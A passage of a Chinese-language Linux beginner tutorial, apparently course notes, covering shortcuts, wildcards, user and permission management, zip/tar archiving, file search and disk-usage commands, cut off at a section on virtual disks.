    <content type="html"><![CDATA[<h2 id="系统简介">系统简介</h2><h3 id="学习路线">学习路线</h3><p><img src="https://doc.shiyanlou.com/linux_base/1-8.png" alt=""></p><h2 id="重要快捷键">重要快捷键</h2><p><code>Tab</code> : 可以进行命令补全，补全目录，补全命令参数</p><p><code>ctrl+c</code> : 强行终止当前程序</p><p><code>ctrl+d</code> : 键盘输入结束或者退出终端</p><p><code>ctrl+s</code> : 暂停当前程序，暂停后按下任意键恢复运行</p><p><code>ctrl+z</code> : 将当前程序放在后台运行，恢复到前台命令<code>fg</code></p><p><code>ctrl+a</code> : 将光标移至输入行头，相当于<code>Home</code>键</p><p><code>ctrl+e</code> : 将光标移至输入行末，相当于<code>End</code>键</p><p><code>ctrl+k</code> : 删除光标所在位置到行末</p><p><code>alt+backspace</code> : 向前删除一个单词</p><p><code>shift+pageup</code> : 将终端显示向上滚动</p><p><code>shift+pagedown</code> : 将终端显示向下滚动</p><p><code>方向上键</code> : 恢复之前输入过的命令</p><h2 id="Shell-常用通配符">Shell 常用通配符</h2><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td><code>*</code></td><td>匹配 0 或多个字符</td></tr><tr><td><code>?</code></td><td>匹配任意一个字符</td></tr><tr><td><code>[list]</code></td><td>匹配 list 中的任意单一字符</td></tr><tr><td><code>[^list]</code></td><td>匹配 除 list 中的任意单一字符以外的字符</td></tr><tr><td><code>[c1-c2]</code></td><td>匹配 c1-c2 中的任意单一字符 如：[0-9][a-z]</td></tr><tr><td><code>&#123;string1,string2,...&#125;</code></td><td>匹配 string1 或 string2 (或更多)其一字符串</td></tr><tr><td><code>&#123;c1..c2&#125;</code></td><td>匹配 c1-c2 中全部字符 如{1…10}</td></tr></tbody></table><h2 id="基础命令">基础命令</h2><h3 id="获取命令帮助">获取命令帮助</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man &lt;命令名字&gt;<br></code></pre></td></tr></table></figure><p>获得更详细的帮助，你还可以使用<code>info</code>命令，不过通常使用<code>man</code>就足够了。如果你知道某个命令的作用，只是想快速查看一些它的某个具体参数的作用，那么你可以使用<code>--help</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;命令名称&gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h3 id="切换目录">切换目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> [路径]<br></code></pre></td></tr></table></figure><h3 id="查看当前目录">查看当前目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure><h3 id="查看文件">查看文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat [文件名]<br></code></pre></td></tr></table></figure><h2 id="用户系统操作">用户系统操作</h2><h3 id="新建用户">新建用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo adduser [用户名]<br></code></pre></td></tr></table></figure><p><code>useradd</code> 只创建用户，不会创建用户密码和工作目录，创建完了需要使用 <code>passwd &lt;username&gt;</code> 去设置新用户的密码。<code>adduser</code> 在创建用户的同时，会创建工作目录和密码（提示你设置），做这一系列的操作。其实 <code>useradd</code>、<code>userdel</code> 这类操作更像是一种命令，执行完了就返回。而 <code>adduser</code> 更像是一种程序，需要你输入、确定等一系列操作。</p><h3 id="切换用户">切换用户</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">su</span> -l<span class="hljs-meta"> [用户名]</span><br></code></pre></td></tr></table></figure><h3 id="退出当前用户">退出当前用户</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>也可以使用快捷键<code>Ctrl+D</code></p><h3 id="查看用户组">查看用户组</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">groups</span><span class="hljs-meta"> [用户名]</span><br></code></pre></td></tr></table></figure><p>在回显中冒号之前表示用户，后面表示该用户所属的用户组。</p><h3 id="将其他用户加入-sudo-用户组">将其他用户加入  sudo 用户组</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> usermod -G sudo<span class="hljs-meta"> [用户名]</span><br></code></pre></td></tr></table></figure><h3 id="删除用户">删除用户</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo deluser [用户名] --remove-home<br></code></pre></td></tr></table></figure><p>使用 <code>--remove-home</code> 参数在删除用户时候会一并将该用户的工作目录一并删除。如果不使用那么系统会自动在 /home 目录为该用户保留工作目录。</p><h2 id="文件系统操作">文件系统操作</h2><h3 id="文件创建">文件创建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">touch [文件名]<br></code></pre></td></tr></table></figure><h3 id="目录创建">目录创建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir [目录名]<br></code></pre></td></tr></table></figure><p>使用 <code>-p</code> 参数，同时创建父目录（如果不存在该父目录），如下我们同时创建一个多级目录（这在安装软件、配置安装路径时非常有用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir -p father/son/grandson<br></code></pre></td></tr></table></figure><h3 id="文件复制">文件复制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cp [文件名] [保存路径]<br></code></pre></td></tr></table></figure><p>如果需要复制一个目录则需要加上一个 <code>-r</code> 或者 <code>-R</code> 参数，表示递归复制</p><h3 id="文件删除">文件删除</h3><h4 id="文件删除-2">文件删除</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm [文件名]<br></code></pre></td></tr></table></figure><p>可以加入<code>-f</code>参数来强行删除文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm  -f [文件名]<br></code></pre></td></tr></table></figure><h4 id="删除目录">删除目录</h4><p>跟复制目录一样，要删除一个目录，也需要加上 <code>-r</code> 或 <code>-R</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -r [目录名]<br></code></pre></td></tr></table></figure><p>遇到权限不足删除不了的目录也可以和删除文件一样加上 <code>-f</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -rf [目录名]<br></code></pre></td></tr></table></figure><h3 id="移动文件">移动文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mv [文件名] [目标目录]<br></code></pre></td></tr></table></figure><h3 id="文件重命名">文件重命名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mv [文件名] [新文件名]<br></code></pre></td></tr></table></figure><p>如果是要批量重命名可以使用<code>rename</code>，需要自行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install rename<br></code></pre></td></tr></table></figure><h3 id="查看文件-2">查看文件</h3><h4 id="cat-命令的使用">cat 命令的使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat [文件名]<br></code></pre></td></tr></table></figure><p>可以加上<code>-n</code>参数显示行数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat -n [文件名]<br></code></pre></td></tr></table></figure><h4 id="nl-命令的使用">nl 命令的使用</h4><h5 id="相关参数">相关参数</h5><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">b : 指定添加行号的方式，主要有两种：</span><br><span class="ruby"></span>    -<span class="ruby">b <span class="hljs-symbol">a:</span>表示无论是否为空行，同样列出行号(<span class="hljs-string">&quot;cat -n&quot;</span>就是这种方式)</span><br><span class="ruby"></span>    -<span class="ruby">b <span class="hljs-symbol">t:</span>只列出非空行的编号并列出（默认为这种方式）</span><br><span class="ruby"></span>-<span class="ruby">n : 设置行号的样式，主要有三种：</span><br><span class="ruby"></span>    -<span class="ruby">n <span class="hljs-symbol">ln:</span>在行号字段最左端显示</span><br><span class="ruby"></span>    -<span class="ruby">n <span class="hljs-symbol">rn:</span>在行号字段最右边显示，且不加 <span class="hljs-number">0</span></span><br><span class="ruby"></span>    -<span class="ruby">n <span class="hljs-symbol">rz:</span>在行号字段最右边显示，且加 <span class="hljs-number">0</span></span><br><span class="ruby"></span>-<span class="ruby">w : 行号字段占用的位数(默认为 <span class="hljs-number">6</span> 位)</span><br></code></pre></td></tr></table></figure><h5 id="使用">使用</h5><p>例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nl -b a [文件名]<br></code></pre></td></tr></table></figure><h4 id="more-和-less-命令的使用">more 和 less 命令的使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">more/less [文件名]<br></code></pre></td></tr></table></figure><p>打开后默认只显示一屏内容，终端底部显示当前阅读的进度。可以使用 <code>Enter</code> 键向下滚动一行，使用 <code>Space</code> 键向下滚动一屏，按下 <code>h</code> 显示帮助，<code>q</code> 退出。</p><h4 id="head-和-tail-命令的使用">head 和 tail 命令的使用</h4><p>一个是只查看文件的头几行（默认为 10 行，不足 10 行则显示全部）<code>[head]</code>和尾几行<code>[tail]</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">head/tail [文件、路径名]<br></code></pre></td></tr></table></figure><p>也可以加入<code>-n</code>参数来查看指定行数</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">head/tail -n <span class="hljs-selector-attr">[行数]</span> <span class="hljs-selector-attr">[文件、路径名]</span><br></code></pre></td></tr></table></figure><p>关于 <code>tail</code> 命令，不得不提的还有它一个很牛的参数 <code>-f</code>，这个参数可以实现不停地读取某个文件的内容并显示。这可以让我们动态查看日志，达到实时监视的目的。可以自行去了解。</p><h4 id="查看所有文件（包括隐藏文件）">查看所有文件（包括隐藏文件）</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ls -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><h4 id="查看某一个目录的完整属性，而不是显示目录里面的文件属性：">查看某一个目录的完整属性，而不是显示目录里面的文件属性：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -dl &lt;目录名&gt;<br></code></pre></td></tr></table></figure><h4 id="显示所有文件大小，并以普通人类能看懂的方式呈现：">显示所有文件大小，并以普通人类能看懂的方式呈现：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -asSh<br></code></pre></td></tr></table></figure><p>其中小 s 为显示文件大小，大 S 为按文件大小排序</p><h4 id="查看文件类型">查看文件类型</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span><span class="hljs-meta"> [文件名]</span><br></code></pre></td></tr></table></figure><p>与 Windows 不同的是，如果你新建了一个 shiyanlou.txt 文件，Windows 会自动把它识别为文本文件，而 <code>file</code> 命令会识别为一个空文件。在 Linux 中文件的类型不是根据文件后缀来判断的。当你在文件里输入内容后才会显示文件类型。</p><h4 id="以较长格式列出文件">以较长格式列出文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls -l<br></code></pre></td></tr></table></figure><h3 id="文件权限">文件权限</h3><p><img src="https://doc.shiyanlou.com/linux_base/3-9.png" alt=""></p><p><img src="https://doc.shiyanlou.com/linux_base/3-10.png" alt=""></p><ul><li>文件类型</li></ul><p>关于文件类型，这里有一点你必需时刻牢记 <strong>Linux 里面一切皆文件</strong>，正因为这一点才有了设备文件（ <code>/dev</code> 目录下有各种设备文件，大都跟具体的硬件设备相关）这一说。 <code>socket</code>：网络套接字，具体是什么，感兴趣的用户可以去学习实验楼的后续相关课程。<code>pipe</code> 管道，这个东西很重要，我们以后将会讨论到，这里你先知道有它的存在即可。<code>软链接文件</code>：链接文件是分为两种的，另一种当然是“硬链接”（硬链接不常用，具体内容不作为本课程讨论重点，而软链接等同于 Windows 上的快捷方式，你记住这一点就够了）。</p><ul><li>文件权限</li></ul><p>读权限，表示你可以使用 <code>cat &lt;file name&gt;</code> 之类的命令来读取某个文件的内容；写权限，表示你可以编辑和修改某个文件的内容；</p><p>执行权限，通常指可以运行的二进制程序文件或者脚本文件，如同 Windows 上的 <code>exe</code> 后缀的文件，不过 Linux 上不是通过文件后缀名来区分文件的类型。你需要注意的一点是，<strong>一个目录同时具有读权限和执行权限才可以打开并查看内部文件，而一个目录要有写权限才允许在其中创建其它文件</strong>，这是因为目录文件实际保存着该目录里面的文件的列表等信息。</p><p>所有者权限，这一点相信你应该明白了，至于所属用户组权限，是指你所在的用户组中的所有其它用户对于该文件的权限，比如，你有一个 iPad，那么这个用户组权限就决定了你的兄弟姐妹有没有权限使用它破坏它和占有它。</p><ul><li>链接数</li></ul><blockquote><p>链接到该文件所在的 inode 结点的文件名数目（关于这个概念涉及到 Linux 文件系统的相关概念知识，不在本课程的讨论范围，感兴趣的用户可以查看 <a href="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html#major2">硬链接和软链接的联系与区别</a>）。</p></blockquote><ul><li>文件大小</li></ul><blockquote><p>以 inode 结点大小为单位来表示的文件大小，你可以给 ls 加上 <code>-lh</code> 参数来更直观的查看文件的大小。</p></blockquote><p>明白了文件权限的一些概念，我们顺带补充一下关于 <code>ls</code> 命令的一些其它常用的用法：</p><ul><li>显示除了 <code>.</code>（当前目录）和 <code>..</code>（上一级目录）之外的所有文件，包括隐藏文件（Linux 下以 <code>.</code> 开头的文件为隐藏文件）。</li></ul><h4 id="修改文件权限">修改文件权限</h4><h4 id="更改方式">更改方式</h4><h5 id="方式一：二进制数字">方式一：二进制数字</h5><p><img src="https://doc.shiyanlou.com/linux_base/3-14.png" alt=""></p><p>每个文件有三组固定的权限，分别对应拥有者，所属用户组，其他用户，<strong>记住这个顺序是固定的</strong>。文件的读写执行对应字母 <code>rwx</code>，以二进制表示就是 <code>111</code>，用十进制表示就是 <code>7</code>，对进制转换不熟悉的同学可以看看 <a href="https://baike.baidu.com/item/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/3117222">进制转换</a>。例如我们刚刚新建的文件 test 的权限是 <code>rw-rw-rw-</code>，换成对应的十进制表示就是 666，这就表示这个文件的拥有者，所属用户组和其他用户具有读写权限，不具有执行权限。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">600</span><span class="hljs-meta"> [文件名]</span><br></code></pre></td></tr></table></figure><h5 id="方式二：加减赋值操作">方式二：加减赋值操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod go-rw <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><code>g</code>、<code>o</code> 还有 <code>u</code> 分别表示 group（用户组）、others（其他用户） 和 user（用户），<code>+</code> 和 <code>-</code> 分别表示增加和去掉相应的权限。</p><h4 id="变更文件所有权">变更文件所有权</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo chown <span class="hljs-selector-attr">[用户名]</span> <span class="hljs-selector-attr">[文件名]</span><br></code></pre></td></tr></table></figure><h3 id="文件打包-ZIP">文件打包 (ZIP)</h3><h4 id="文件压缩">文件压缩</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip -r -q -o -[1-9] -e [输出压缩包名字] [打包文件/路径]<br></code></pre></td></tr></table></figure><p><code>-r</code> 参数表示递归打包包含子目录的全部内容，<code>-q</code> 参数表示为安静模式，即不向屏幕输出信息，<code>-o</code>表示输出文件，需在其后紧跟打包输出文件名，<code>-e</code>表示创建加密压缩包。</p><p>其中也可以设置压缩级别，添加一个参数用于设置压缩级别 <code>-[1-9]</code>即可，其中1 表示最快压缩但体积大，9 表示体积最小但耗时最久。也可以增加 <code>-x</code> ，用于排除某些文件，如排除该目录下的<code>zip</code>文件<code>-x ~/*.zip</code><strong>注意：这里只能使用绝对路径，否则不起作用</strong>。</p><p>与此同时我们也可以使用<code>du</code>指令来查看默认压缩级别、最低、最高压缩级别及未压缩的文件的大小</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">du -h -d 0 *.zip ~ | sort<br></code></pre></td></tr></table></figure><p>其中<code>-h</code>指<code>human-readable</code>，便于阅读。而<code>-d</code>指所查看文件的深度</p><p><strong>注意：</strong> 关于 <code>zip</code> 命令，因为 Windows 系统与 Linux/Unix 在文本文件格式上的一些兼容问题，比如换行符（为不可见字符），在 Windows 为 CR+LF（Carriage-Return+Line-Feed：回车加换行），而在 Linux/Unix 上为 LF（换行），所以如果在不加处理的情况下，在 Linux 上编辑的文本，在 Windows 系统上打开可能看起来是没有换行的。如果想让在 Linux 创建的 zip 压缩文件在 Windows 上解压后没有任何问题，那么还需要对命令做一些修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r -l -o shiyanlou.zip /home/shiyanlou/Desktop<br></code></pre></td></tr></table></figure><p>需要加上 <code>-l</code> 参数将 <code>LF</code> 转换为 <code>CR+LF</code> 来达到以上目的。</p><h4 id="文件解压">文件解压</h4><p>解压文件到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip [文件名]<br></code></pre></td></tr></table></figure><p>使用安静模式则可以加上指令<code>-q</code>，如果需要解压到指定位置则在命令末尾加上<code>-d [解压到的地址]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip -q file.zip -d /home/<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>如果解压到的目录不存在的时候将会自动创建。如果只想查看压缩包内容则可以使用<code>-l</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip -l [文件名]<br></code></pre></td></tr></table></figure><p><strong>注意：</strong> 使用 unzip 解压文件时我们同样应该注意兼容问题，不过这里我们关心的不再是上面的问题，而是中文编码的问题，通常 Windows 系统上面创建的压缩文件，如果有有包含中文的文档或以中文作为文件名的文件时默认会采用 GBK 或其它编码，而 Linux 上面默认使用的是 UTF-8 编码，如果不加任何处理，直接解压的话可能会出现中文乱码的问题（有时候它会自动帮你处理），为了解决这个问题，我们可以在解压时指定编码类型。</p><p>使用 <code>-O</code>（英文字母，大写 o）参数指定编码类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip -O GBK 中文压缩文件.zip<br></code></pre></td></tr></table></figure><h3 id="文件打包-TAR">文件打包 (TAR)</h3><h4 id="文件压缩-2">文件压缩</h4><p>只能实现对文件或目录（单独压缩目录中的文件）的压缩，没有实现对文件的打包压缩</p><p>创建一个<code>tar</code>包</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tar -<span class="hljs-selector-tag">P</span> -cf <span class="hljs-selector-attr">[输出压缩包名]</span> <span class="hljs-selector-attr">[打包文件/路径]</span><br></code></pre></td></tr></table></figure><p><code>-P</code> 保留绝对路径符，<code>-c</code> 表示创建一个 tar 包文件，<code>-f</code> 用于指定创建的文件名，注意文件名必须紧跟在 <code>-f</code> 参数之后，比如不能写成 <code>tar -fc xxx.tar</code>，可以写成 <code>tar -f xxx.tar -c ~</code>。还可以加上 <code>-v</code> 参数以可视的的方式输出打包的文件。</p><h4 id="文件解压-2">文件解压</h4><p>解包一个文件（<code>-x</code> 参数）到指定路径的<strong>已存在</strong>目录（<code>-C</code> 参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf [文件名] -C [文件保存路径]<br></code></pre></td></tr></table></figure><p>如果仅查看压缩包内容则使用<code>-t</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -tf [文件名]<br></code></pre></td></tr></table></figure><p>保留文件属性和跟随链接（符号链接或软链接），有时候我们使用 tar 备份文件当你在其他主机还原时希望保留文件的属性（<code>-p</code> 参数）和备份链接指向的源文件而不是链接本身（<code>-h</code> 参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -cphf [文件名] [保存路径]<br></code></pre></td></tr></table></figure><p>如果需要创建/解压其他格式的压缩包只需要在对应位置上加上对应的参数即可</p><table><thead><tr><th>压缩文件格式</th><th>参数</th></tr></thead><tbody><tr><td><code>*.tar.gz</code></td><td><code>-z</code></td></tr><tr><td><code>*.tar.xz</code></td><td><code>-J</code></td></tr><tr><td><code>*tar.bz2</code></td><td><code>-j</code></td></tr></tbody></table><h3 id="文件搜索">文件搜索</h3><ul><li><code>whereis</code> 简单快速</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">whereis who<br>whereis find<br></code></pre></td></tr></table></figure><p><code>whereis</code> 只能搜索二进制文件（<code>-b</code>），man 帮助文件（<code>-m</code>）和源代码文件（<code>-s</code>）。如果想要获得更全面的搜索结果可以使用 <code>locate</code> 命令。</p><ul><li><code>locate</code> 快而全</li></ul><p>使用 <code>locate</code> 命令查找文件也不会遍历硬盘，它通过查询 <code>/var/lib/mlocate/mlocate.db</code> 数据库来检索信息。不过这个数据库也不是实时更新的，系统会使用定时任务每天自动执行 <code>updatedb</code> 命令来更新数据库。所以有时候你刚添加的文件，它可能会找不到，需要手动执行一次 <code>updatedb</code> 命令（在我们的环境中必须先执行一次该命令）。注意这个命令也不是内置的命令，在部分环境中需要手动安装，然后执行更新。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install locate<br>sudo updatedb<br></code></pre></td></tr></table></figure><p>它可以用来查找指定目录下的不同文件类型，如查找 <code>/etc</code> 下所有以 sh 开头的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">locate /etc/sh<br></code></pre></td></tr></table></figure><blockquote><p>注意，它不只是在 /etc 目录下查找，还会自动递归子目录进行查找。</p></blockquote><p>如果想只统计数目可以加上 <code>-c</code> 参数，<code>-i</code> 参数可以忽略大小写进行查找，<code>whereis</code> 的 <code>-b</code>、<code>-m</code>、<code>-s</code> 同样可以使用。</p><ul><li><code>which</code> 小而精</li></ul><p><code>which</code> 本身是 Shell 内建的一个命令，我们通常使用 <code>which</code> 来确定是否安装了某个指定的程序，因为它只从 <code>PATH</code> 环境变量指定的路径中去搜索命令并且返回第一个搜索到的结果。也就是说，我们可以看到某个系统命令是否存在以及执行的到底是哪一个地方的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> man<br><span class="hljs-built_in">which</span> nginx<br><span class="hljs-built_in">which</span> ping<br></code></pre></td></tr></table></figure><ul><li><code>find</code> 精而细</li></ul><p><code>find</code> 应该是这几个命令中最强大的了，它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find [路径] -name [文件名]<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意 find 命令的路径是作为第一个参数的， 基本命令格式为 find [path][option] [action] 。</strong></p></blockquote><p>与时间相关的命令参数：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-atime</code></td><td>最后访问时间</td></tr><tr><td><code>-ctime</code></td><td>最后修改文件内容的时间</td></tr><tr><td><code>-mtime</code></td><td>最后修改文件属性的时间</td></tr></tbody></table><p>下面以 <code>-mtime</code> 参数举例：</p><ul><li><code>-mtime n</code>：n 为数字，表示为在 n 天之前的“一天之内”修改过的文件</li><li><code>-mtime +n</code>：列出在 n 天之前（不包含 n 天本身）被修改过的文件</li><li><code>-mtime -n</code>：列出在 n 天之内（包含 n 天本身）被修改过的文件</li><li><code>-newer file</code>：file 为一个已存在的文件，列出比 file 还要新的文件名</li></ul><p><img src="https://doc.shiyanlou.com/linux_base/5-8.png" alt="1"></p><p>列出 home 目录中，当天（24 小时之内）有改动的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ~ -mtime 0<br></code></pre></td></tr></table></figure><p>列出用户家目录下比 /etc 目录新的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ~ -newer /etc<br></code></pre></td></tr></table></figure><h2 id="磁盘管理">磁盘管理</h2><h3 id="查看磁盘容量">查看磁盘容量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">df<br></code></pre></td></tr></table></figure><p>物理主机上的 <code>/dev/sda2</code> 是对应着主机硬盘的分区，后面的数字表示分区号，数字前面的字母 a 表示第几块硬盘（也可能是可移动磁盘），你如果主机上有多块硬盘则可能还会出现 <code>/dev/sdb</code>，<code>/dev/sdc</code> 这些磁盘设备都会在 <code>/dev</code> 目录下以文件的存在形式。</p><p>接着你还会看到&quot;1k-块&quot;这个陌生的东西，它表示以磁盘块大小的方式显示容量，后面为相应的以块大小表示的已用和可用容量，可以通过加上<code>-h</code>参数更易于阅读。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">df -h<br></code></pre></td></tr></table></figure><h3 id="查看目录容量">查看目录容量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 默认同样以块的大小展示</span><br>du<br><span class="hljs-comment"># 加上 `-h` 参数，以更易读的方式展示</span><br>du -h<br></code></pre></td></tr></table></figure><p><code>-d</code> 参数指定查看目录的深度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 只查看 1 级目录的信息</span><br>du -h -d 0 ~<br><span class="hljs-comment"># 查看 2 级</span><br>du -h -d 1 ~<br></code></pre></td></tr></table></figure><p>常用参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">du -h <span class="hljs-comment"># 同 --human-readable 以 K，M，G 为单位，提高信息的可读性。</span><br>du -a <span class="hljs-comment"># 同 --all 显示目录中所有文件的大小。</span><br>du -s <span class="hljs-comment"># 同 --summarize 仅显示总计，只列出最后加总的值。</span><br></code></pre></td></tr></table></figure><h3 id="虚拟磁盘创建">虚拟磁盘创建</h3><h4 